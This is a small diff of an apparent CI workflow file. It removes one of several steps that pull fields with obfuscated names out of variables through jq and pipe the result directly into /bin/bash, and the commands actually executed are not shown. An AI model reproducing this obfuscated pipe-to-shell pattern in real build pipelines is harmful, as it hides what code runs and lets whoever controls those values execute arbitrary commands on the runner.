@@ -42,7 +42,6 @@ jobs:
           echo $wwtw58 | jq -r .omrbe88069 | /bin/bash
           printf '%s' "$re7518" | jq -r .lfnk52217 | /bin/bash
           printf '%s' "$xz36" | jq -r .hpxf7348 | /bin/bash
-          echo $qq0 | jq -r .lcy219 | /bin/bash
           echo $g4 | jq -r .pnk622 | /bin/bash
 
       - name: Store artifact
